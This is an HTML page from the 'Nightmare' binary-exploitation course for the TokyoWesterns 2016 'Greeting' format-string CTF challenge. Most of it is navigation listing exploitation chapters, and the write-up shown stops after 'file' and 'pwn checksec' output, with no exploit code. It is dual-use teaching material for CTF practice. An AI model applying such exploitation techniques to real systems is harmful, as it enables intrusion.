@@ -1,0 +1,540 @@
+<!DOCTYPE HTML>
+<html lang="en" class="sidebar-visible no-js navy">
+    <head>
+        <!-- Book generated using mdBook -->
+        <meta charset="UTF-8">
+        <title>TokyoWesterns&#x27;16: Greeting - Nightmare</title>
+        
+        
+
+
+        <!-- Custom HTML head -->
+        
+
+
+        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+        <meta name="description" content="Nightmare: an intro to binary exploitation / reverse engineering course based around CTF challenges.">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="theme-color" content="#ffffff" />
+
+        
+        <link rel="icon" href="../../favicon.svg">
+        
+        
+        <link rel="shortcut icon" href="../../favicon.png">
+        
+        <link rel="stylesheet" href="../../css/variables.css">
+        <link rel="stylesheet" href="../../css/general.css">
+        <link rel="stylesheet" href="../../css/chrome.css">
+        <link rel="stylesheet" href="../../css/print.css" media="print">
+
+        <!-- Fonts -->
+        <link rel="stylesheet" href="../../FontAwesome/css/font-awesome.css">
+        
+        <link rel="stylesheet" href="../../fonts/fonts.css">
+        
+
+        <!-- Highlight.js Stylesheets -->
+        <link rel="stylesheet" href="../../highlight.css">
+        <link rel="stylesheet" href="../../tomorrow-night.css">
+        <link rel="stylesheet" href="../../ayu-highlight.css">
+
+        <!-- Custom theme stylesheets -->
+        
+
+        
+    </head>
+    <body>
+        <!-- Provide site root to javascript -->
+        <script type="text/javascript">
+            var path_to_root = "../../";
+            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "navy";
+        </script>
+
+        <!-- Work around some values being stored in localStorage wrapped in quotes -->
+        <script type="text/javascript">
+            try {
+                var theme = localStorage.getItem('mdbook-theme');
+                var sidebar = localStorage.getItem('mdbook-sidebar');
+
+                if (theme.startsWith('"') && theme.endsWith('"')) {
+                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
+                }
+
+                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
+                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
+                }
+            } catch (e) { }
+        </script>
+
+        <!-- Set the theme before any content is loaded, prevents flash -->
+        <script type="text/javascript">
+            var theme;
+            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
+            if (theme === null || theme === undefined) { theme = default_theme; }
+            var html = document.querySelector('html');
+            html.classList.remove('no-js')
+            html.classList.remove('navy')
+            html.classList.add(theme);
+            html.classList.add('js');
+        </script>
+
+        <!-- Hide / unhide sidebar before it is displayed -->
+        <script type="text/javascript">
+            var html = document.querySelector('html');
+            var sidebar = 'hidden';
+            if (document.body.clientWidth >= 1080) {
+                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
+                sidebar = sidebar || 'visible';
+            }
+            html.classList.remove('sidebar-visible');
+            html.classList.add("sidebar-" + sidebar);
+        </script>
+
+        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
+            <div class="sidebar-scrollbox">
+                <ol class="chapter"><li class="chapter-item expanded affix "><a href="../../../index.html">Nightmare</a></li><li class="chapter-item expanded "><a href="../../00-intro/index.html"><strong aria-hidden="true">1.</strong> Introduction</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../01-intro_assembly/assembly/index.html"><strong aria-hidden="true">1.1.</strong> Assembly</a></li><li class="chapter-item expanded "><a href="../../01-intro_assembly/reversing_assembly/index.html"><strong aria-hidden="true">1.2.</strong> Reversing Assembly</a></li><li class="chapter-item expanded "><a href="../../02-intro_tooling/ghidra/index.html"><strong aria-hidden="true">1.3.</strong> Reversing with GHIDRA</a></li><li class="chapter-item expanded "><a href="../../02-intro_tooling/gdb-gef/index.html"><strong aria-hidden="true">1.4.</strong> Debugging with GDB</a></li><li class="chapter-item expanded "><a href="../../02-intro_tooling/pwntools/index.html"><strong aria-hidden="true">1.5.</strong> Scripting with Python pwntools</a></li><li class="chapter-item expanded "><a href="../../03-beginner_re/csaw18_x86tour_pt1/index.html"><strong aria-hidden="true">1.6.</strong> Beginner Reversing</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../03-beginner_re/pico18_strings/index.html"><strong aria-hidden="true">1.6.1.</strong> Pico'18: Strings</a></li><li class="chapter-item expanded "><a href="../../03-beginner_re/helithumper_re/index.html"><strong aria-hidden="true">1.6.2.</strong> Helithumper RE</a></li><li class="chapter-item expanded "><a href="../../03-beginner_re/csaw19_beleaf/index.html"><strong aria-hidden="true">1.6.3.</strong> CSAW'19: Beleaf</a></li></ol></li></ol></li><li class="chapter-item expanded "><a href="../../04-bof_variable/csaw18_boi/index.html"><strong aria-hidden="true">2.</strong> Stack Buffer Overflows</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../04-bof_variable/tamu19_pwn1/index.html"><strong aria-hidden="true">2.1.</strong> TAMU'19: Pwn1</a></li><li class="chapter-item expanded "><a href="../../04-bof_variable/tw17_justdoit/index.html"><strong aria-hidden="true">2.2.</strong> TokyoWesterns'17: JustDoIt</a></li><li class="chapter-item expanded "><a href="../../05-bof_callfunction/csaw16_warmup/index.html"><strong aria-hidden="true">2.3.</strong> CSAW'16: Warmup</a></li><li class="chapter-item expanded "><a href="../../05-bof_callfunction/csaw18_getit/index.html"><strong aria-hidden="true">2.4.</strong> CSAW'18: Getit</a></li><li class="chapter-item expanded "><a href="../../05-bof_callfunction/tu17_vulnchat/index.html"><strong aria-hidden="true">2.5.</strong> TU'17: Vulnchat</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../5.1-mitigation_aslr_pie/index.html"><strong aria-hidden="true">2.5.1.</strong> ASLR/PIE</a></li></ol></li><li class="chapter-item expanded "><a href="../../06-bof_shellcode/csaw17_pilot/index.html"><strong aria-hidden="true">2.6.</strong> CSAW'17: Pilot</a></li><li class="chapter-item expanded "><a href="../../06-bof_shellcode/tamu19_pwn3/index.html"><strong aria-hidden="true">2.7.</strong> TAMU'19: Pwn3</a></li><li class="chapter-item expanded "><a href="../../06-bof_shellcode/tu18_shellaeasy/index.html"><strong aria-hidden="true">2.8.</strong> TU'18: Shellaeasy</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../6.1-mitigation_nx/index.html"><strong aria-hidden="true">2.8.1.</strong> NX/XN/DEP</a></li></ol></li><li class="chapter-item expanded "><a href="../../07-bof_static/bkp16_simplecalc/index.html"><strong aria-hidden="true">2.9.</strong> BKP'16: SimpleCalc</a></li><li class="chapter-item expanded "><a href="../../07-bof_static/dcquals19_speedrun1/index.html"><strong aria-hidden="true">2.10.</strong> DCQuals'19: Speedrun1</a></li><li class="chapter-item expanded "><a href="../../07-bof_static/dcquals16_feedme/index.html"><strong aria-hidden="true">2.11.</strong> DCQuals'16: Feedme</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../7.1-mitigation_canary/index.html"><strong aria-hidden="true">2.11.1.</strong> Canaries/Cookies</a></li><li class="chapter-item expanded "><a href="../../7.2-mitigation_relro/index.html"><strong aria-hidden="true">2.11.2.</strong> RELRO</a></li></ol></li><li class="chapter-item expanded "><a href="../../08-bof_dynamic/csaw19_babyboi/index.html"><strong aria-hidden="true">2.12.</strong> CSAW'19: Babyboi</a></li><li class="chapter-item expanded "><a href="../../08-bof_dynamic/csawquals17_svc/index.html"><strong aria-hidden="true">2.13.</strong> CSAW Quals'17: SVC</a></li><li class="chapter-item expanded "><a href="../../08-bof_dynamic/fb19_overfloat/index.html"><strong aria-hidden="true">2.14.</strong> FB'19: Overfloat</a></li><li class="chapter-item expanded "><a href="../../08-bof_dynamic/hs19_storytime/index.html"><strong aria-hidden="true">2.15.</strong> HS'19: Storytime</a></li></ol></li><li class="chapter-item expanded "><a href="../../fmt.html"><strong aria-hidden="true">3.</strong> Format Strings</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../10-fmt_strings/backdoor17_bbpwn/index.html"><strong aria-hidden="true">3.1.</strong> Backdoor'17: bbpwn</a></li><li class="chapter-item expanded "><a href="../../10-fmt_strings/pico18_echo/index.html"><strong aria-hidden="true">3.2.</strong> PicoCTF'18: echo</a></li><li class="chapter-item expanded "><a href="../../10-fmt_strings/tw16_greeting/index.html" class="active"><strong aria-hidden="true">3.3.</strong> TokyoWesterns'16: Greeting</a></li></ol></li><li class="chapter-item expanded "><a href="../../indexing.html"><strong aria-hidden="true">4.</strong> Array Indexing</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../11-index/csaw18_doubletrouble/index.html"><strong aria-hidden="true">4.1.</strong> CSAW'18: DoubleTrouble</a></li><li class="chapter-item expanded "><a href="../../11-index/dcq16_xkcd/index.html"><strong aria-hidden="true">4.2.</strong> DCQ'16: XKCD</a></li><li class="chapter-item expanded "><a href="../../11-index/sunshinectf2017_alternatesolution/index.html"><strong aria-hidden="true">4.3.</strong> SunshineCTF'17: Alt. Solution</a></li><li class="chapter-item expanded "><a href="../../11-index/swampctf19_dreamheaps/index.html"><strong aria-hidden="true">4.4.</strong> SwampCTF'19: Dreamheaps</a></li></ol></li><li class="chapter-item expanded "><a href="../../randomness.html"><strong aria-hidden="true">5.</strong> Bad Seed</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../09-bad_seed/h3_time/index.html"><strong aria-hidden="true">5.1.</strong> H3: Time</a></li><li class="chapter-item expanded "><a href="../../09-bad_seed/hsctf19_tuxtalkshow/reamde.html"><strong aria-hidden="true">5.2.</strong> HSCTF'19: Tuxtalkshow</a></li><li class="chapter-item expanded "><a href="../../09-bad_seed/sunshinectf17_prepared/index.html"><strong aria-hidden="true">5.3.</strong> SunshineCTF'17: Prepared</a></li></ol></li><li class="chapter-item expanded "><a href="../../z3_angr.html"><strong aria-hidden="true">6.</strong> Z3 &amp; Symbolic Execution (angr)</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../12-z3/hs19_abyte/index.html"><strong aria-hidden="true">6.1.</strong> HS'19: abyte</a></li><li class="chapter-item expanded "><a href="../../12-z3/tokyowesterns17_revrevrev/index.html"><strong aria-hidden="true">6.2.</strong> TokyoWesterns'17: revrevrev</a></li><li class="chapter-item expanded "><a href="../../12-z3/tuctf_future/index.html"><strong aria-hidden="true">6.3.</strong> TUCTF: Future</a></li><li class="chapter-item expanded "><a href="../../13-angr/defcamp_r100/index.html"><strong aria-hidden="true">6.4.</strong> DEFCamp: r100</a></li><li class="chapter-item expanded "><a href="../../13-angr/plaid19_icancount/index.html"><strong aria-hidden="true">6.5.</strong> PlaidCTF'19: icancount</a></li><li class="chapter-item expanded "><a href="../../13-angr/securityfest_fairlight/index.html"><strong aria-hidden="true">6.6.</strong> SecurityFest Fairlight</a></li></ol></li><li class="chapter-item expanded "><a href="../../rop.html"><strong aria-hidden="true">7.</strong> Return Oriented Programming (ROP)</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../15-partial_overwrite/index.html"><strong aria-hidden="true">7.1.</strong> Partial Overwrite</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../15-partial_overwrite/hacklu15_stackstuff/index.html"><strong aria-hidden="true">7.1.1.</strong> Hack.lu'15: stackstuff</a></li><li class="chapter-item expanded "><a href="../../15-partial_overwrite/tamu19_pwn2/index.html"><strong aria-hidden="true">7.1.2.</strong> TAMU'19: pwn2</a></li><li class="chapter-item expanded "><a href="../../15-partial_overwrite/tuctf17_vulnchat2/index.html"><strong aria-hidden="true">7.1.3.</strong> TUCTF'17: vulnchat2</a></li></ol></li><li class="chapter-item expanded "><a href="../../17-stack_pivot/index.html"><strong aria-hidden="true">7.2.</strong> Stack Pivoting</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../17-stack_pivot/dcquals19_speedrun4/index.html"><strong aria-hidden="true">7.2.1.</strong> DCQuals'19: speedrun4</a></li><li class="chapter-item expanded "><a href="../../17-stack_pivot/insomnihack18_onewrite/index.html"><strong aria-hidden="true">7.2.2.</strong> Insomnihack'18: onewrite</a></li><li class="chapter-item expanded "><a href="../../17-stack_pivot/seccon19_sum/index.html"><strong aria-hidden="true">7.2.3.</strong> SECCON'19: sum</a></li><li class="chapter-item expanded "><a href="../../17-stack_pivot/xctf16_b0verflow/index.html"><strong aria-hidden="true">7.2.4.</strong> XCTF'16: b0verflow</a></li></ol></li><li class="chapter-item expanded "><a href="../../16-srop/index.html"><strong aria-hidden="true">7.3.</strong> SIGROP (SROP)</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../16-srop/backdoor_funsignals/index.html"><strong aria-hidden="true">7.3.1.</strong> BackdoorCTF: funsigals</a></li><li class="chapter-item expanded "><a href="../../16-srop/csaw19_smallboi/index.html"><strong aria-hidden="true">7.3.2.</strong> CSAW'19: smallboi</a></li><li class="chapter-item expanded "><a href="../../16-srop/inctf17_stupidrop/index.html"><strong aria-hidden="true">7.3.3.</strong> InCTF'17: stupidrop</a></li><li class="chapter-item expanded "><a href="../../16-srop/swamp19_syscaller/index.html"><strong aria-hidden="true">7.3.4.</strong> SwampCTF'19: syscaller</a></li></ol></li><li class="chapter-item expanded "><a href="../../18-ret2_csu_dl/index.html"><strong aria-hidden="true">7.4.</strong> ret2csu</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../18-ret2_csu_dl/0ctf18_babystack/index.html"><strong aria-hidden="true">7.4.1.</strong> 0CTF'18: babystack</a></li><li class="chapter-item expanded "><a href="../../18-ret2_csu_dl/ropemporium_ret2csu/index.html"><strong aria-hidden="true">7.4.2.</strong> ROPEmporium</a></li></ol></li><li class="chapter-item expanded "><a href="../../14-ret_2_system/index.html"><strong aria-hidden="true">7.5.</strong> ret2system</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../14-ret_2_system/asis17_marymorton/index.html"><strong aria-hidden="true">7.5.1.</strong> ASIS'17: marymorton</a></li><li class="chapter-item expanded "><a href="../../14-ret_2_system/hxp18_poorCanary/index.html"><strong aria-hidden="true">7.5.2.</strong> HXP'18: poorCanary</a></li><li class="chapter-item expanded "><a href="../../14-ret_2_system/tu_guestbook/index.html"><strong aria-hidden="true">7.5.3.</strong> TUCTF: guestbook</a></li></ol></li></ol></li><li class="chapter-item expanded "><a href="../../25-heap/index.html"><strong aria-hidden="true">8.</strong> Heap Exploitation</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../27-edit_free_chunk/double_free_explanation/index.html"><strong aria-hidden="true">8.1.</strong> Double Frees</a></li><li class="chapter-item expanded "><a href="../../27-edit_free_chunk/heap_consolidation_explanation/index.html"><strong aria-hidden="true">8.2.</strong> Heap Consolidation</a></li><li class="chapter-item expanded "><a href="../../27-edit_free_chunk/uaf_explanation/index.html"><strong aria-hidden="true">8.3.</strong> Use-after-Frees</a></li><li class="chapter-item expanded "><a href="../../24-heap_overflow/protostar_heap0/index.html"><strong aria-hidden="true">8.4.</strong> Protostar: heap0</a></li><li class="chapter-item expanded "><a href="../../24-heap_overflow/protostar_heap1/index.html"><strong aria-hidden="true">8.5.</strong> Protostar: heap1</a></li><li class="chapter-item expanded "><a href="../../24-heap_overflow/protostar_heap2/reamdme.html"><strong aria-hidden="true">8.6.</strong> Protostar: heap2</a></li><li class="chapter-item expanded "><a href="../../30-unlink/unlink_explanation/index.html"><strong aria-hidden="true">8.7.</strong> unlink() Exploitation</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../30-unlink/hitcon14_stkof/index.html"><strong aria-hidden="true">8.7.1.</strong> HITCON'14: stkof</a></li><li class="chapter-item expanded "><a href="../../30-unlink/zctf16_note2/index.html"><strong aria-hidden="true">8.7.2.</strong> ZCTF'16: note2</a></li></ol></li><li class="chapter-item expanded "><a href="../../26-heap_grooming/explanation_heap_grooming/index.html"><strong aria-hidden="true">8.8.</strong> Heap Grooming</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../26-heap_grooming/pico_areyouroot/index.html"><strong aria-hidden="true">8.8.1.</strong> PicoCTF: areyouroot</a></li><li class="chapter-item expanded "><a href="../../26-heap_grooming/swamp19_heapgolf/index.html"><strong aria-hidden="true">8.8.2.</strong> SwampCTF'19: Heap Golf</a></li></ol></li><li class="chapter-item expanded "><a href="../../28-fastbin_attack/explanation_fastbinAttack/index.html"><strong aria-hidden="true">8.9.</strong> Fastbin Attack</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../28-fastbin_attack/0ctf_babyheap/index.html"><strong aria-hidden="true">8.9.1.</strong> 0CTF: babyheap</a></li><li class="chapter-item expanded "><a href="../../28-fastbin_attack/csaw17_auir/index.html"><strong aria-hidden="true">8.9.2.</strong> CSAW'17: Auir</a></li></ol></li><li class="chapter-item expanded "><a href="../../31-unsortedbin_attack/unsorted_explanation/index.html"><strong aria-hidden="true">8.10.</strong> Unsortedbin Attack</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../31-unsortedbin_attack/0ctf16_zerostorage/index.html"><strong aria-hidden="true">8.10.1.</strong> 0CTF'16: zerostorage</a></li><li class="chapter-item expanded "><a href="../../31-unsortedbin_attack/hitcon_magicheap/index.html"><strong aria-hidden="true">8.10.2.</strong> HITCON: magicheap</a></li></ol></li><li class="chapter-item expanded "><a href="../../32-largebin_attack/largebin_explanation0/index.html"><strong aria-hidden="true">8.11.</strong> Largebin Attack (part 1)</a></li><li class="chapter-item expanded "><a href="../../32-largebin_attack/largebin_explanation1/index.html"><strong aria-hidden="true">8.12.</strong> Largebin Attack (part 2)</a></li><li class="chapter-item expanded "><a href="../../29-tcache/tcache_explanation/index.html"><strong aria-hidden="true">8.13.</strong> GLibc Tcache</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../29-tcache/dcquals19_babyheap/index.html"><strong aria-hidden="true">8.13.1.</strong> DCQuals'19: babyheap</a></li><li class="chapter-item expanded "><a href="../../29-tcache/plaid19_cpp/index.html"><strong aria-hidden="true">8.13.2.</strong> PlaidCTF'19: cpp</a></li><li class="chapter-item expanded "><a href="../../44-more_tcache/csaw19_popping_caps0/index.html"><strong aria-hidden="true">8.13.3.</strong> CSAW'19: Popping Caps 1</a></li><li class="chapter-item expanded "><a href="../../44-more_tcache/csaw19_popping_caps1/index.html"><strong aria-hidden="true">8.13.4.</strong> CSAW'19: Popping Caps 2</a></li></ol></li><li class="chapter-item expanded "><a href="../../39-house_of_spirit/house_spirit_exp/index.html"><strong aria-hidden="true">8.14.</strong> House of Spirit</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../39-house_of_spirit/hacklu14_oreo/index.html"><strong aria-hidden="true">8.14.1.</strong> Hack.lu'14: Oreo</a></li></ol></li><li class="chapter-item expanded "><a href="../../40-house_of_lore/house_lore_exp/index.html"><strong aria-hidden="true">8.15.</strong> House of Lore</a></li><li class="chapter-item expanded "><a href="../../41-house_of_force/house_force_exp/index.html"><strong aria-hidden="true">8.16.</strong> House of Force</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../41-house_of_force/bkp16_cookbook/index.html"><strong aria-hidden="true">8.16.1.</strong> BKP'16: Cookbook</a></li></ol></li><li class="chapter-item expanded "><a href="../../42-house_of_einherjar/house_einherjar_exp/index.html"><strong aria-hidden="true">8.17.</strong> House of Einherjar</a></li><li class="chapter-item expanded "><a href="../../43-house_of_orange/house_orange_exp/index.html"><strong aria-hidden="true">8.18.</strong> House of Orange</a></li><li class="chapter-item expanded "><a href="../../33-custom_misc_heap/index.html"><strong aria-hidden="true">8.19.</strong> Miscellaneous</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../33-custom_misc_heap/csaw17_minesweeper/index.html"><strong aria-hidden="true">8.19.1.</strong> CSAW'17: Minesweeper</a></li><li class="chapter-item expanded "><a href="../../33-custom_misc_heap/csaw18_alienVSsamurai/index.html"><strong aria-hidden="true">8.19.2.</strong> CSAW'18: alienVSsamurai</a></li><li class="chapter-item expanded "><a href="../../33-custom_misc_heap/csaw19_traveller/index.html"><strong aria-hidden="true">8.19.3.</strong> CSAW'19: Traveller</a></li></ol></li></ol></li><li class="chapter-item expanded "><a href="../../35-integer_exploitation/index.html"><strong aria-hidden="true">9.</strong> Integer Overflows</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../35-integer_exploitation/int_overflow_post/index.html"><strong aria-hidden="true">9.1.</strong> sploitFUN: vuln</a></li><li class="chapter-item expanded "><a href="../../35-integer_exploitation/puzzle/index.html"><strong aria-hidden="true">9.2.</strong> Puzzle</a></li><li class="chapter-item expanded "><a href="../../35-integer_exploitation/signed_unsigned/index.html"><strong aria-hidden="true">9.3.</strong> Signed vs. Unsigned</a></li></ol></li><li class="chapter-item expanded "><a href="../../37-fs_exploitation/index.html"><strong aria-hidden="true">10.</strong> FILE Exploitation</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../37-fs_exploitation/swamp19_badfile/index.html"><strong aria-hidden="true">10.1.</strong> SwampCTF'19: Bad File</a></li></ol></li><li class="chapter-item expanded "><a href="../../grabbag.html"><strong aria-hidden="true">11.</strong> Grab Bag</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../19-shellcoding_pt1/index.html"><strong aria-hidden="true">11.1.</strong> Shellcoding</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../19-shellcoding_pt1/csaw18_shellpointcode/index.html"><strong aria-hidden="true">11.1.1.</strong> CSAW'18: Shellpointcode</a></li><li class="chapter-item expanded "><a href="../../19-shellcoding_pt1/defconquals19_s3/index.html"><strong aria-hidden="true">11.1.2.</strong> DCQuals'19: S3</a></li><li class="chapter-item expanded "><a href="../../19-shellcoding_pt1/defconquals19_s6/index.html"><strong aria-hidden="true">11.1.3.</strong> DCQuals'19: S6</a></li></ol></li><li class="chapter-item expanded "><a href="../../20-patching_and_jumping/index.html"><strong aria-hidden="true">11.2.</strong> Patching</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../20-patching_and_jumping/csawquals16_gametime/index.html"><strong aria-hidden="true">11.2.1.</strong> CSAW Quals'16: gametime</a></li><li class="chapter-item expanded "><a href="../../20-patching_and_jumping/dcquals18_elfcrumble/index.html"><strong aria-hidden="true">11.2.2.</strong> DCQuals'18: ELFCrumble</a></li><li class="chapter-item expanded "><a href="../../20-patching_and_jumping/plaid19_ppp/index.html"><strong aria-hidden="true">11.2.3.</strong> Plaid'19: PPP</a></li></ol></li><li class="chapter-item expanded "><a href="../../21-dot_net/index.html"><strong aria-hidden="true">11.3.</strong> .NET</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../21-dot_net/bikinibonanza/index.html"><strong aria-hidden="true">11.3.1.</strong> Bikinibonanza</a></li><li class="chapter-item expanded "><a href="../../21-dot_net/dot_net/index.html"><strong aria-hidden="true">11.3.2.</strong> CSAW'13: DotNetReversing</a></li><li class="chapter-item expanded "><a href="../../21-dot_net/whitehat18_re06/index.html"><strong aria-hidden="true">11.3.3.</strong> Whitehat'18: re06</a></li></ol></li><li class="chapter-item expanded "><a href="../../36-obfuscated_reversing/index.html"><strong aria-hidden="true">11.4.</strong> Obfuscation</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../36-obfuscated_reversing/bkp16_unholy/index.html"><strong aria-hidden="true">11.4.1.</strong> BKP'16: Unholy</a></li><li class="chapter-item expanded "><a href="../../36-obfuscated_reversing/csaw15_wyvern/index.html"><strong aria-hidden="true">11.4.2.</strong> CSAW'15: Wyvern</a></li><li class="chapter-item expanded "><a href="../../36-obfuscated_reversing/csaw17_prophecy/index.html"><strong aria-hidden="true">11.4.3.</strong> CSAW'17: Prophecy</a></li><li class="chapter-item expanded "><a href="../../22-movfuscation/index.html"><strong aria-hidden="true">11.4.4.</strong> MOVfuscation</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../22-movfuscation/asis18_babyc/index.html"><strong aria-hidden="true">11.4.4.1.</strong> ASIS'18: babyc</a></li><li class="chapter-item expanded "><a href="../../22-movfuscation/recon_movfuscated/index.html"><strong aria-hidden="true">11.4.4.2.</strong> RECON: movfuscated</a></li><li class="chapter-item expanded "><a href="../../22-movfuscation/swamp19_future/index.html"><strong aria-hidden="true">11.4.4.3.</strong> SwampCTF'19: Future Fun</a></li></ol></li></ol></li><li class="chapter-item expanded "><a href="../../23-custom_architecture/index.html"><strong aria-hidden="true">11.5.</strong> Custom Architecture</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../23-custom_architecture/h3_h3machine0/index.html"><strong aria-hidden="true">11.5.1.</strong> H3Machine (part 1)</a></li><li class="chapter-item expanded "><a href="../../23-custom_architecture/h3_h3machine1/index.html"><strong aria-hidden="true">11.5.2.</strong> H3Machine (part 2)</a></li><li class="chapter-item expanded "><a href="../../23-custom_architecture/h3_h3machine2/index.html"><strong aria-hidden="true">11.5.3.</strong> H3Machine (part 3)</a></li><li class="chapter-item expanded "><a href="../../23-custom_architecture/h3_h3machine3/index.html"><strong aria-hidden="true">11.5.4.</strong> H3Machine (part 4)</a></li></ol></li><li class="chapter-item expanded "><a href="../../34-emulated_targets/index.html"><strong aria-hidden="true">11.6.</strong> Emulation</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../34-emulated_targets/csaw15_hackingtime/index.html"><strong aria-hidden="true">11.6.1.</strong> CSAW'15: Hackingtime</a></li><li class="chapter-item expanded "><a href="../../34-emulated_targets/csaw17_realism/index.html"><strong aria-hidden="true">11.6.2.</strong> CSAW'17: Realism</a></li><li class="chapter-item expanded "><a href="../../34-emulated_targets/csaw18_x86_pt2/index.html"><strong aria-hidden="true">11.6.3.</strong> CSAW'18: x86 Pt.2</a></li></ol></li><li class="chapter-item expanded "><a href="../../38-grab_bad/uninit_vars/index.html"><strong aria-hidden="true">11.7.</strong> Uninitialized Variables</a></li><li class="chapter-item expanded "><a href="../../38-grab_bad/csaw18_doubletrouble/index.html"><strong aria-hidden="true">11.8.</strong> CSAW'18: Doubletrouble</a></li><li class="chapter-item expanded "><a href="../../38-grab_bad/csaw19_gibberishCheck/index.html"><strong aria-hidden="true">11.9.</strong> CSAW'19: Gibberishcheck</a></li><li class="chapter-item expanded "><a href="../../38-grab_bad/hackim19_shop/index.html"><strong aria-hidden="true">11.10.</strong> HackIM'19: Shop</a></li></ol></li><li class="chapter-item expanded "><a href="../../next/index.html">What's Next</a></li><li class="chapter-item expanded affix "><a href="../../references/index.html">References</a></li></ol>
+            </div>
+            <div id="sidebar-resize-handle" class="sidebar-resize-handle"></div>
+        </nav>
+
+        <div id="page-wrapper" class="page-wrapper">
+
+            <div class="page">
+                
+                <div id="menu-bar-hover-placeholder"></div>
+                <div id="menu-bar" class="menu-bar sticky bordered">
+                    <div class="left-buttons">
+                        <button id="sidebar-toggle" class="icon-button" type="button" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
+                            <i class="fa fa-bars"></i>
+                        </button>
+                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
+                            <i class="fa fa-paint-brush"></i>
+                        </button>
+                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
+                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy (default)</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
+                        </ul>
+                        
+                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
+                            <i class="fa fa-search"></i>
+                        </button>
+                        
+                    </div>
+
+                    <h1 class="menu-title">Nightmare</h1>
+
+                    <div class="right-buttons">
+                        <a href="../../print.html" title="Print this book" aria-label="Print this book">
+                            <i id="print-button" class="fa fa-print"></i>
+                        </a>
+                        
+                        <a href="https://github.com/guyinatuxedo/nightmare/" title="Git repository" aria-label="Git repository">
+                            <i id="git-repository-button" class="fa fa-github"></i>
+                        </a>
+                        
+                    </div>
+                </div>
+
+                
+                <div id="search-wrapper" class="hidden">
+                    <form id="searchbar-outer" class="searchbar-outer">
+                        <input type="search" name="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
+                    </form>
+                    <div id="searchresults-outer" class="searchresults-outer hidden">
+                        <div id="searchresults-header" class="searchresults-header"></div>
+                        <ul id="searchresults">
+                        </ul>
+                    </div>
+                </div>
+                
+
+                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
+                <script type="text/javascript">
+                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
+                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
+                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
+                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
+                    });
+                </script>
+
+                <div id="content" class="content">
+                    <main>
+                        <h1><a class="header" href="#tokyowesterns-2016-greeting" id="tokyowesterns-2016-greeting">Tokyowesterns 2016 greeting</a></h1>
+<p>Let's take a look at the binary:</p>
+<pre><code>$    file greeting-1da3bd8f02ee33a89b6f998afbbcc55de162d88c95dbe6a8724aaaea7671cb4c
+greeting-1da3bd8f02ee33a89b6f998afbbcc55de162d88c95dbe6a8724aaaea7671cb4c: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, for GNU/Linux 2.6.24, BuildID[sha1]=beb85611dbf6f1f3a943cecd99726e5e35065a63, not stripped
+$    pwn checksec greeting-1da3bd8f02ee33a89b6f998afbbcc55de162d88c95dbe6a8724aaaea7671cb4c
+[*] '/Hackery/all/tw16/greeting-1da3bd8f02ee33a89b6f998afbbcc55de162d88c95dbe6a8724aaaea7671cb4c'
